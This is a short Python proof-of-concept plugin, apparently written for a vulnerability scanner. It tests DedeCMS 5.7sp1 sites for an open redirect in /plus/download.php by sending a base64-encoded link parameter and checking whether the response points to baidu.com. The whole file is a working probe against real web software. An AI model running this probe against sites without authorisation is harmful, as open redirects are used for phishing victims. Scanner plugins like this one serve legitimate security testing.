#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: dedecms download.php重定向漏洞
referer: http://skyhome.cn/dedecms/357.html
author: Lucifer
description: 在dedecms 5.7sp1的/plus/download.php中67行存在的代码，即接收参数后未进行域名的判断就进行了跳转。
'''
import HackRequests

def poc(arg, **kwargs):
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/plus/download.php?open=1&link=aHR0cHM6Ly93d3cuYmFpZHUuY29t"
    vulnurl = arg + payload
    hh = HackRequests.hackRequests()
    try:
        r = hh.http(vulnurl,headers=headers)

        if r"www.baidu.com" in r.text():
            result = {
                "name": "dedecms download.php重定向",  # 插件名称
                "content": "在dedecms 5.7sp1的/plus/download.php中67行存在的代码，即接收参数后未进行域名的判断就进行了跳转。",  # 插件返回内容详情，会造成什么后果。
                "url": vulnurl,  # 漏洞存在url
                "log": r.log,
                "tag": "redirect"  # 漏洞标签
            }
            return result

    except:
        return False
